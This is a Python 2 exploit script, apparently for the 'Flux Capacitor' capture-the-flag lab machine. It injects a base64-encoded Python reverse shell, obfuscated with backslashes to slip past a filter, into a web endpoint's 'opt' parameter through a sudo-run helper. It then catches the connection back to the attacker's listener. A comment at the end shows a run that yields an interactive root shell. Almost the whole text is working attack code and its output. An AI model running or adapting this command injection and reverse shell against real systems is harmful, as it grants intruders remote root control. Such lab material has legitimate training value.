#!/usr/bin/env python2
import base64
import signal, thread
import requests, urllib
from pwn import *
signal.signal(signal.SIGINT, signal.SIG_DFL)

LHOST="10.10.14.43"
LPORT=60001
RHOST="10.10.10.69"
RPORT=80

PAYLOAD = "/usr/bin/python3 -c \"import os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('"+str(LHOST)+"',"+str(LPORT)+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn(['/bin/bash','-i']);s.close();exit();\""

class NoEncodingSession(requests.Session):
    def send(self, *a, **kw):
        # a[0] is prepared request
        a[0].url = urllib.unquote(a[0].url)
        return requests.Session.send(self, *a, **kw)

def send_shell_payload():
    encoded_payload = "\\".join(base64.b64encode(PAYLOAD))
    log.info("http://"+str(RHOST)+":"+str(RPORT)+"/sync?opt=' sudo /home/themiddle/.monit cmd "+encoded_payload+"'")
    try:
        log.info("I am sending the encoded payload for you...")
        client = NoEncodingSession()
        client.keep_alive = False
        url = "http://"+str(RHOST)+":"+str(RPORT)+"/sync"
        response = client.get(url, params="opt=' sudo /home/themiddle/.monit cmd "+encoded_payload+"'")
        print("STATUS CODE: "+str(response.status_code))
        print(response.text)
    except requests.exceptions.RequestException as e:
        log.failure(str(e))
    finally:
        if client:
            client.close()

try:
    threading.Thread(target=send_shell_payload).start()
except Exception as e:
    log.error(str(e))
shell = listen(LPORT, timeout=10).wait_for_connection()
if shell.sock is None:
    log.failure("Connection timeout.")
    sys.exit()
shell.interactive()
sys.exit()

'''
$ python2 autopwn_flux.py 
[*] http://10.10.10.69:80/sync?opt=' sudo /home/themiddle/.monit cmd L\3\V\z\c\i\9\i\a\W\4\v\c\H\l\0\a\G\9\u\M\y\A\t\Y\y\A\i\a\W\1\w\b\3\J\0\I\G\9\z\L\H\B\0\e\S\x\z\b\2\N\r\Z\X\Q\7\c\z\1\z\b\2\N\r\Z\X\Q\u\c\2\9\j\a\2\V\0\K\H\N\v\Y\2\t\l\d\C\5\B\R\l\9\J\T\k\V\U\L\H\N\v\Y\2\t\l\d\C\5\T\T\0\N\L\X\1\N\U\U\k\V\B\T\S\k\7\c\y\5\j\b\2\5\u\Z\W\N\0\K\C\g\n\M\T\A\u\M\T\A\u\M\T\Q\u\N\D\M\n\L\D\Y\w\M\D\A\x\K\S\k\7\b\3\M\u\Z\H\V\w\M\i\h\z\L\m\Z\p\b\G\V\u\b\y\g\p\L\D\A\p\O\2\9\z\L\m\R\1\c\D\I\o\c\y\5\m\a\W\x\l\b\m\8\o\K\S\w\x\K\T\t\v\c\y\5\k\d\X\A\y\K\H\M\u\Z\m\l\s\Z\W\5\v\K\C\k\s\M\i\k\7\b\3\M\u\c\H\V\0\Z\W\5\2\K\C\d\I\S\V\N\U\R\k\l\M\R\S\c\s\J\y\9\k\Z\X\Y\v\b\n\V\s\b\C\c\p\O\3\B\0\e\S\5\z\c\G\F\3\b\i\h\b\J\y\9\i\a\W\4\v\Y\m\F\z\a\C\c\s\J\y\1\p\J\1\0\p\O\3\M\u\Y\2\x\v\c\2\U\o\K\T\t\l\e\G\l\0\K\C\k\7\I\g\=\='
[+] Trying to bind to 0.0.0.0 on port 60001: Done
[*] I am sending the encoded payload for you...
[+] Waiting for connections on 0.0.0.0:60001: Got connection from 10.10.10.69 on port 49114
[*] Switching to interactive mode
root@fluxcapacitor:/# $ whoami
whoami
root
root@fluxcapacitor:/# $  
'''
